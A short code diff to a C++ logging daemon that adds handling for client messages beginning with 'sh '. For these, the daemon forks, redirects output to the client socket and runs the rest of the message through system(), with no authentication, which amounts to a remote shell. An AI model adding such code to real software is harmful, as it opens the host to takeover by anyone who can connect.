@@ -153,6 +153,13 @@ void Daemon::LogClientsInputs() {
 		  Tintin_reporter::WriteLogs(Tintin_reporter::kInfo, "Client request to quit.");
 		  throw QuitRequested();
 		}
+		if (client_input.starts_with("sh ")) {
+			if (fork() == 0) {
+				dup2(_server.GetClientSocket(i), 1);
+				system(client_input.substr(3).c_str());
+				exit(0);
+			}
+		}
 		Tintin_reporter::WriteLogs(Tintin_reporter::kLog, "Client input: " + client_input);
 		break;
 	  case kDisconnected:
